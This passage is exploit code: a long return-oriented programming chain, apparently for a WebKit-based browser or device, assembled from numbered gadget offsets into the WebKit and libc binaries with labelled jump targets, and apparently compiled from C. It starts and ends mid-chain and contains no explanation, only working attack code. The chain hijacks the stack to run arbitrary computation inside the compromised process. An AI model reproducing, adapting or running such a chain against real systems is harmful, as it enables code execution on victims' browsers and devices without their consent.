webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L137:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L138:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L139:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L140:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+71584, //L142-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+71568, //L141-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L141:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L142:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L143:
db([65280, 0]); // 0xff00
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+71696, //L146-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L146:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+26378423, //and rax, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L147:
db([8, 0]); // 0x8
set_gadget(libc_base+467092,); //pop rax
//L148:
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+71880, //L149-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L149:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+71936, //L152-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L152:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+72064, //L155-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L153:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L155:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+72168, //L158-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+72152, //L157-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L157:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L158:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+72336, //L161-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+72352, //L162-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+72304, //L159-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+72320, //L160-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L159:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L160:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L161:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L162:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+72448, //L164-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+72432, //L163-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L163:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L164:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L165:
db([24, 0]); // 0x18
set_gadget(libc_base+467092,); //pop rax
//L166:
db([24, 0]); // 0x18
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+72600, //L167-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L167:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+72656, //L170-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L170:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222, //pop rsi
ropchain+72792, //L173-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+72760, //L171-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L171:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L172:
db([32, 0]); // 0x20
set_gadget(libc_base+467092,); //pop rax
//L173:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+72904, //L174-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+72936, //L176-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+72920, //L175-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L174:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L175:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L176:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+73032, //L177-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+73048, //L178-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L177:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+73160, //L179-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+73144, //L180-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L180:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L179:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+73248, //L182-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+73232, //L181-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L181:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L182:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+73344, //L183-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+73360, //L184-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L183:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L184:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+73472, //L185-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+73456, //L186-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L186:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L185:
db([0, 0]); // 0x0
//___builtin_bswap64:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+73544, //L187-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L187:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+73608, //L189-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L189:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+73704, //L193-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L191:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L193:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+73776, //L196-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L194:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L196:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+7880191, //mov [rax], rcx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L197:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L199:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+73896, //L201-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L200:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L201:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2935451, //mov [rax], ecx
libc_base+362222, //pop rsi
ropchain+73952, //L204-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L204:
db([0, 0]); // 0x0
//L202:
set_gadgets([
libc_base+362222, //pop rsi
ropchain+74016, //L207-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L205:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L207:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+74120, //L210-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+74104, //L209-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L209:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L210:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+74288, //L213-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+74304, //L214-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+74256, //L211-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+74272, //L212-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L211:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L212:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L213:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L214:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+74376, //L215-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+74392, //L216-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L215:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L216:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+74488, //L218-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+74472, //L217-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L217:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L218:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+74568, //L219-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L219:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L220:
db([4, 0]); // 0x4
set_gadget(libc_base+155394,); //pop rdi
//L221:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+74704, //L222-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+74736, //L224-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+74720, //L223-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L222:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L223:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L224:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+19066556, //cmp rax, rcx ; setb al
webkit_base+6790262, //setl al
libc_base+227029, //movzx eax, al
libc_base+362222, //pop rsi
ropchain+74904, //L226-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+74920, //L227-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+74888, //L225-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L225:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L226:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L227:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+75024, //L229-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+75072, //L232-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+75056, //L231-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L229:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L230:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L231:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L232:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+75200, //L233+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+75176, //L233-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L233:
db([0, 0]); // 0x0
set_gadgets([
ropchain+75216, //L233+24
ropchain+75232, //L228
libc_base+766440, //pop rsp
ropchain+75248, //L234
//L228:
libc_base+766440, //pop rsp
ropchain+85640, //L235
//L234:
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L236:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L238:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+75368, //L241-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+75352, //L240-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L240:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L241:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+75512, //L244-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+75480, //L242-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+75496, //L243-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L242:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L243:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L244:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+75584, //L245-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L245:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+75640, //L248-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L248:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L249:
db([7, 0]); // 0x7
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+75784, //L252-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L250:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L252:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+75888, //L255-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+75872, //L254-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L254:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L255:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+76056, //L258-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+76072, //L259-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+76024, //L256-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+76040, //L257-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L256:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L257:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L258:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L259:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+76176, //L260-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+76208, //L262-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+76192, //L261-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L260:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L261:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L262:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+76312, //L263-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+76328, //L264-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L263:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+76416, //L265-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L265:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+76472, //L268-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L268:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+76608, //L270-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+76624, //L271-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+76592, //L269-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L269:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L270:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L271:
db([0, 0]); // 0x0
set_gadgets([
libc_base+223872, //mov al, [rdi]
libc_base+362222, //pop rsi
ropchain+76784, //L275-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+76736, //L272-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+76768, //L274-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L272:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L273:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L274:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L275:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+76840, //L277-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+76944, //L278-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+76976, //L280-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+76960, //L279-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L278:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L279:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L280:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+77136, //L284-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+77088, //L281-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+77120, //L283-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L281:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L282:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L283:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L284:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+77192, //L286-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L286:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+77296, //L287-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+77328, //L289-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+77312, //L288-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L287:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L288:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L289:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+77488, //L293-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+77440, //L290-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+77472, //L292-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L290:
